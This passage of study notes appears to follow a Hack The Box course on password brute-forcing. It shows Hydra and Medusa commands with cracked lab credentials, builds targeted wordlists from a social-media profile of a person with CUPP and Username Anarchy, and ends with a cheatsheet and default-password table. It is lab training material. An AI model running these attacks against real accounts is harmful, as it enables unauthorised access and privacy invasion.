+GENERAL: Total Hosts: 1
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 197
+...
+ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
+...
+GENERAL: Medusa has finished.
+```
+
+The key differences here are:
+
+- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
+- `-u ftpuser`: Specifies the username `ftpuser`.
+- `-M ftp`: Selects the FTP module within Medusa.
+- `-t 5`: Increases the number of parallel login attempts to 5.
+
+### Retrieving The Flag
+
+Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:
+
+```shell
+gitblanc@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
+
+Trying [::1]:21 ...
+Connected to localhost.
+220 (vsFTPd 3.0.5)
+331 Please specify the password.
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+200 Switching to Binary mode.
+ftp> ls
+229 Entering Extended Passive Mode (|||25926|)
+150 Here comes the directory listing.
+-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
+226 Directory send OK.
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||37251|)
+150 Opening BINARY mode data connection for flag.txt (35 bytes).
+100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
+226 Transfer complete.
+35 bytes received in 00:00 (131.45 KiB/s)
+ftp> exit
+221 Goodbye.
+```
+
+Then read the file to get the flag:
+
+```shell
+gitblanc@htb[/htb]$ cat flag.txt
+HTB{...}
+```
+
+The ease with which such attacks can be executed underscores the importance of employing strong, unique passwords.
+
+>[!Example]
+>The academy exercise for this section
+
+I crafted the following medusa command:
+
+```shell
+medusa -h 94.237.49.98 -n 54513 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+
+[redacted]
+2025-03-03 23:56:45 ACCOUNT FOUND: [ssh] Host: 94.237.49.98 User: sshuser Password: 1q2w3e4r5t
+```
+
+So then I logged in with this credentials: `sshuser:1q2w3e4r5t`. Once inside, I'll check for other services running inside the machine with:
+
+```shell
+netstat -tulpn | grep LISTEN
+
+[redacted]
+tcp        0      0 0.0.0.0:22         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22              :::*                    LISTEN      -                   
+tcp6       0      0 :::21              :::*                    LISTEN      -
+```
+
+As ftp is running, I'll brute force it with medusa again (inside the machine):
+- I know that the ftp user is called `ftpuser` because we can check the content of `/etc/passwd`
+
+```shell
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+
+[redacted]
+ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
+```
+
+So we've got credentials: `ftpuser:qqww1122`. We can the get the flag.
+
+# Custom Wordlists
+
+While pre-made wordlists like `rockyou` or `SecLists` provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catching the right combination. While effective in some scenarios, this approach can be inefficient and time-consuming, especially when targeting specific individuals or organizations with unique password or username patterns.
+
+Consider the scenario where a pentester attempts to compromise the account of "Thomas Edison" at his workplace. A generic username list like `xato-net-10-million-usernames-dup.txt` is unlikely to yield any meaningful results. Given the potential username conventions enforced by his company, the probability of his specific username being included in such a massive dataset is minimal. These could range from a straightforward first name/last name format to more intricate combinations like last name/first three.
+
+In such cases, the power of custom wordlists comes into play. These meticulously crafted lists, tailored to the specific target and their environment, dramatically increase brute-force attacks' efficiency and success rate. They leverage information gathered from various sources, such as social media profiles, company directories, or even leaked data, to create a focused and highly relevant set of potential passwords and usernames. This laser-sharp approach minimizes wasted effort and maximizes the chances of cracking the target account.
+
+## Username Anarchy
+
+Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane.s` may seem adequate, they barely scratch the surface of the potential username landscape.
+
+Human creativity knows no bounds, and usernames often become a canvas for personal expression. Jane could seamlessly weave in her middle name, birth year, or a cherished hobby, leading to variations like `janemarie`, `smithj87`, or `jane_the_gardener`. The allure of `leetspeak`, where letters are replaced with numbers or symbols, could manifest in usernames like `j4n3`, `5m1th`, or `j@n3_5m1th`. Her passion for a particular book, movie, or band might inspire usernames like `winteriscoming`, `potterheadjane`, or `smith_beatles_fan`.
+
+This is where `Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
+
+```shell
+gitblanc@htb[/htb]$ ./username-anarchy -l
+
+Plugin name             Example
+--------------------------------------------------------------------------------
+first                   anna
+firstlast               annakey
+first.last              anna.key
+firstlast[8]            annakey
+first[4]last[4]         annakey
+firstl                  annak
+f.last                  a.key
+flast                   akey
+lfirst                  kanna
+l.first                 k.anna
+lastf                   keya
+last                    key
+last.f                  key.a
+last.first              key.anna
+FLast                   AKey
+first1                  anna0,anna1,anna2
+fl                      ak
+fmlast                  abkey
+firstmiddlelast         annaboomkey
+fml                     abk
+FL                      AK
+FirstLast               AnnaKey
+First.Last              Anna.Key
+Last                    Key
+```
+
+First, install ruby, and then pull the `Username Anarchy` git to get the script:
+
+```shell
+gitblanc@htb[/htb]$ sudo apt install ruby -y
+gitblanc@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
+gitblanc@htb[/htb]$ cd username-anarchy
+```
+
+Next, execute it with the target's first and last names. This will generate possible username combinations.
+
+```shell
+gitblanc@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
+```
+
+Upon inspecting `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing:
+
+- Basic combinations: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
+- Initials: `js`, `j.s.`, `s.j.`, etc.
+- etc
+
+This comprehensive list, tailored to the target's name, is valuable in a brute-force attack.
+
+## CUPP
+
+With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.
+
+Let's continue our exploration with Jane Smith. We've already employed `Username Anarchy` to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.
+
+The efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?
+
+- `Social Media`: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.
+- `Company Websites`: Jane's current or past employers' websites might list her name, position, and even her professional bio, offering insights into her work life.
+- `Public Records`: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.
+- `News Articles and Blogs`: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.
+
+OSINT will be a goldmine of information for CUPP. Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. For example, let's say you have put together this profile based on Jane Smith's Facebook postings.
+
+|Field|Details|
+|---|---|
+|Name|Jane Smith|
+|Nickname|Janey|
+|Birthdate|December 11, 1990|
+|Relationship Status|In a relationship with Jim|
+|Partner's Name|Jim (Nickname: Jimbo)|
+|Partner's Birthdate|December 12, 1990|
+|Pet|Spot|
+|Company|AHI|
+|Interests|Hackers, Pizza, Golf, Horses|
+|Favorite Colors|Blue|
+
+CUPP will then take your inputs and create a comprehensive list of potential passwords:
+
+- Original and Capitalized: `jane`, `Jane`
+- Reversed Strings: `enaj`, `enaJ`
+- Birthdate Variations: `jane1994`, `smith2708`
+- Concatenations: `janesmith`, `smithjane`
+- Appending Special Characters: `jane!`, `smith@`
+- Appending Numbers: `jane123`, `smith2024`
+- Leetspeak Substitutions: `j4n3`, `5m1th`
+- Combined Mutations: `Jane1994!`, `smith2708@`
+
+This process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve. This focused approach dramatically increases the odds of success in our password-cracking endeavors.
+
+If you're using Pwnbox, CUPP is likely pre-installed. Otherwise, install it using:
+
+```shell
+gitblanc@htb[/htb]$ sudo apt install cupp -y
+```
+
+Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:
+
+```shell
+gitblanc@htb[/htb]$ cupp -i
+
+___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: Jane
+> Surname: Smith
+> Nickname: Janey
+> Birthdate (DDMMYYYY): 11121990
+
+
+> Partners) name: Jim
+> Partners) nickname: Jimbo
+> Partners) birthdate (DDMMYYYY): 12121990
+
+
+> Child's name:
+> Child's nickname:
+> Child's birthdate (DDMMYYYY):
+
+
+> Pet's name: Spot
+> Company name: AHI
+
+
+> Do you want to add some key words about the victim? Y/[N]: y
+> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
+> Do you want to add special chars at the end of words? Y/[N]: y
+> Do you want to add some random numbers at the end of words? Y/[N]:y
+> Leet mode? (i.e. leet = 1337) Y/[N]: y
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to jane.txt, counting 46790 words.
+[+] Now load your pistolero with jane.txt and shoot! Good luck!
+```
+
+We now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.
+
+- Minimum Length: 6 characters
+- Must Include:
+    - At least one uppercase letter
+    - At least one lowercase letter
+    - At least one number
+    - At least two special characters (from the set `!@#$%^&*`)
+
+As we did earlier, we can use grep to filter that password list to match that policy:
+
+```shell
+gitblanc@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+```
+
+This command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in `jane-filtered.txt`.
+
+Use the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.
+
+```shell
+gitblanc@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
+[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
+[PORT][http-post-form] host: IP   login: ...   password: ...
+[STATUS] attack finished for IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
+```
+
+Once Hydra has completed the attack, log into the website using the discovered credentials and retrieve the flag.
+
+>[!Example]
+>The academy exercise for this section
+
+I initialized cupp in interactive mode and filled Jane's data. Then I grepped the wordlist to meet her company's password requirements:
+
+```shell
+cupp -i
+
+[filled data]
+
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+```
+
+- Minimum Length: 6 characters
+- Must Include:
+    - At least one uppercase letter
+    - At least one lowercase letter
+    - At least one number
+    - At least two special characters (from the set `!@#$%^&*`)
+
+Then I generated all possible usernames for Jane with username Anarchy:
+
+```shell
+./username-anarchy Jane Smith > jane_smith_usernames.txt
+```
+
+Then I performed the attack with Hydra:
+
+```shell
+hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.55.128 -s 57736 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+
+[redacted]
+[57736][http-post-form] host: 94.237.55.128   login: jane   password: 3n4J!!
+```
+
+![](Pasted%20image%2020250304002053.png)
+
+# Skills Assessment 1
+
+I first downloaded both wordlists in use:  [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)
+
+![](Pasted%20image%2020250304002437.png)
+
+So I'll run the following attack with Hydra:
+
+```shell
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.249.46 http-get / -s 33448 -t 4
+
+[redacted]
+[33448][http-get] host: 83.136.249.46   login: admin   password: Admin123
+```
+
+Then, when I log in I get this prompt `satwossh`:
+
+![](Pasted%20image%2020250304003509.png)
+
+# Skills Assessment 2
+
+For this one I'll use the username `satwossh` and tried to crack its ssh password using medusa:
+
+```shell
+medusa -h 94.237.55.185 -n 38813 -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -t 3
+
+[redacted]
+2025-03-04 00:40:39 ACCOUNT FOUND: [ssh] Host: 94.237.55.185 User: satwossh Password: password1 [SUCCESS]
+```
+
+So then I logged in with: `satwossh:password1`
+
+Then I checked for running services:
+
+```shell
+netstat -tulpn | grep LISTEN
+
+[redacted]
+tcp        0      0 0.0.0.0:22           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                :::*                    LISTEN      -                   
+tcp6       0      0 :::22                :::*                    LISTEN      -  
+```
+
+So FTP is also running. I checked the content of `/etc/passwd` to know the ftp user which is `thomas`.
+- Note: ==I could have used Username anarchy to identify the ftp username==
+
+Inside of the machine I found a `.txt` called `IncidentReport.txt`:
+
+```txt
+System Logs - Security Report
+
+Date: 2024-09-06
+
+Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.
+
+All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
+
+Security Operations Team
+```
+
+Then I performed a brute force attack to the ftp:
+
+```shell
+medusa -h 127.0.0.1 -u thomas -P passwords.txt -M ftp -t 5
+
+[redacted]
+ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]
+```
+
+Now iIcan read the flag.
+
+# HTB Cheatsheet
+
+## What is Brute Forcing?
+
+A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.
+
+### Factors Influencing Brute Force Attacks
+
+- Complexity of the password or key
+- Computational power available to the attacker
+- Security measures in place
+
+### How Brute Forcing Works
+
+1. Start: The attacker initiates the brute force process.
+2. Generate Possible Combination: The software generates a potential password or key combination.
+3. Apply Combination: The generated combination is attempted against the target system.
+4. Check if Successful: The system evaluates the attempted combination.
+5. Access Granted (if successful): The attacker gains unauthorized access.
+6. End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.
+
+### Types of Brute Forcing
+
+|Attack Type|Description|Best Used When|
+|---|---|---|
+|Simple Brute Force|Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols).|When there is no prior information about the password.|
+|Dictionary Attack|Uses a pre-compiled list of common passwords.|When the password is likely weak or follows common patterns.|
+|Hybrid Attack|Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words.|When the target uses slightly modified versions of common passwords.|
+|Credential Stuffing|Uses leaked credentials from other breaches to access different services where users may have reused passwords.|When you have a set of leaked credentials, and the target may reuse passwords.|
+|Password Spraying|Attempts common passwords across many accounts to avoid detection.|When account lockout policies are in place.|
+|Rainbow Table Attack|Uses precomputed tables of password hashes to reverse them into plaintext passwords.|When a large number of password hashes need cracking, and storage for tables is available.|
+|Reverse Brute Force|Targets a known password against multiple usernames.|When there’s a suspicion of password reuse across multiple accounts.|
+|Distributed Brute Force|Distributes brute force attempts across multiple machines to speed up the process.|When the password is highly complex, and a single machine isn't powerful enough.|
+
+## Default Credentials
+
+- Default Usernames: Pre-set usernames that are widely known
+- Default Passwords: Pre-set, easily guessable passwords that come with devices and software
+
+|Device|Username|Password|
+|---|---|---|
+|Linksys Router|admin|admin|
+|Netgear Router|admin|password|
+|TP-Link Router|admin|admin|
+|Cisco Router|cisco|cisco|
+|Ubiquiti UniFi AP|ubnt|ubnt|
+
+## Brute-Forcing Tools
+
+### Hydra
+
+- Fast network login cracker
+- Supports numerous protocols
+- Uses parallel connections for speed
+- Flexible and adaptable
+- Relatively easy to use
+
+```bash
+hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
+```
+
+|Hydra Service|Service/Protocol|Description|Example Command|
+|---|---|---|---|
+|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
+|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
+|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
+
+### Medusa
+
+- Fast, massively parallel, modular login brute-forcer
+- Supports a wide array of services
+
+```bash
+medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+```
+
+|Medusa Module|Service/Protocol|Description|Example Command|
+|---|---|---|---|
+|ssh|Secure Shell (SSH)|Brute force SSH login for the `admin` user.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh`|
+|ftp|File Transfer Protocol (FTP)|Brute force FTP with multiple usernames and passwords using 5 parallel threads.|`medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5`|
+|rdp|Remote Desktop Protocol (RDP)|Brute force RDP login.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp`|
+|http-get|HTTP Web Services|Brute force HTTP Basic Authentication.|`medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET`|
+|ssh|Secure Shell (SSH)|Stop after the first valid SSH login is found.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f`|
+
+### Custom Wordlists
+
+Username Anarchy generates potential usernames based on a target's name.
+
+|Command|Description|
+|---|---|
+|`username-anarchy Jane Smith`|Generate possible usernames for "Jane Smith"|
+|`username-anarchy -i names.txt`|Use a file (`names.txt`) with names for input. Can handle space, CSV, or TAB delimited names.|
+|`username-anarchy -a --country us`|Automatically generate usernames using common names from the US dataset.|
+|`username-anarchy -l`|List available username format plugins.|
+|`username-anarchy -f format1,format2`|Use specific format plugins for username generation (comma-separated).|
+|`username-anarchy -@ example.com`|Append `@example.com` as a suffix to each username.|
+|`username-anarchy --case-insensitive`|Generate usernames in case-insensitive (lowercase) format.|
+
+CUPP (Common User Passwords Profiler) creates personalized password wordlists based on gathered intelligence.
+
+|Command|Description|
+|---|---|
+|`cupp -i`|Generate wordlist based on personal information (interactive mode).|
+|`cupp -w profiles.txt`|Generate a wordlist from a predefined profile file.|
+|`cupp -l`|Download popular password lists like `rockyou.txt`.|
+
+### Password Policy Filtering
+
+Password policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. `grep` combined with regular expressions can be a powerful tool for filtering wordlists to identify passwords that adhere to a given policy. Below is a table summarizing common password policy requirements and the corresponding `grep` regex patterns to apply:
+
+| Policy Requirement                         | Grep Regex Pattern                                       | Explanation                                                                                                                                                                                                                                                                                                                                                                                                               |
+| ------------------------------------------ | -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Minimum Length (e.g., 8 characters)        | `grep -E '^.{8,}$' wordlist.txt`                         | `^` matches the start of the line, `.` matches any character, `{8,}` matches 8 or more occurrences, `$` matches the end of the line.                                                                                                                                                                                                                                                                                      |
+| At Least One Uppercase Letter              | `grep -E '[A-Z]' wordlist.txt`                           | `[A-Z]` matches any uppercase letter.                                                                                                                                                                                                                                                                                                                                                                                     |
+| At Least One Lowercase Letter              | `grep -E '[a-z]' wordlist.txt`                           | `[a-z]` matches any lowercase letter.                                                                                                                                                                                                                                                                                                                                                                                     |
+| At Least One Digit                         | `grep -E '[0-9]' wordlist.txt`                           | `[0-9]` matches any digit.                                                                                                                                                                                                                                                                                                                                                                                                |
+| At Least One Special Character             | `grep -E '[!@#$%^&*()_+-=[]{};':"\,.<>/?]' wordlist.txt` | `[!@#$%^&*()_+-=[]{};':"\,.<>/?]` matches any special character (symbol).                                                                                                                                                                                                                                                                                                                                                 |
+| No Consecutive Repeated Characters         | `grep -E '(.)\1' wordlist.txt`                           | `(.)` captures any character, `\1` matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use `grep -v` to invert the match.                                                                                                                                                                                                                                   |
+| Exclude Common Patterns (e.g., "password") | `grep -v -i 'password' wordlist.txt`                     | `-v` inverts the match, `-i` makes the search case-insensitive. This pattern will exclude any line containing "password" (or "Password", "PASSWORD", etc.).                                                                                                                                                                                                                                                               |
+| Exclude Dictionary Words                   | `grep -v -f dictionary.txt wordlist.txt`                 | `-f` reads patterns from a file. `dictionary.txt` should contain a list of common dictionary words, one per line.                                                                                                                                                                                                                                                                                                         |
+| Combination of Requirements                | `grep -E '^.{8,}$' wordlist.txt \| grep -E '[A-Z]'`      | This command filters a wordlist to meet multiple password policy requirements. It first ensures that each word has a minimum length of 8 characters (`grep -E '^.{8,}$'`), and then it pipes the result into a second `grep` command to match only words that contain at least one uppercase letter (`grep -E '[A-Z]'`). This approach ensures the filtered passwords meet both the length and uppercase letter criteria. |
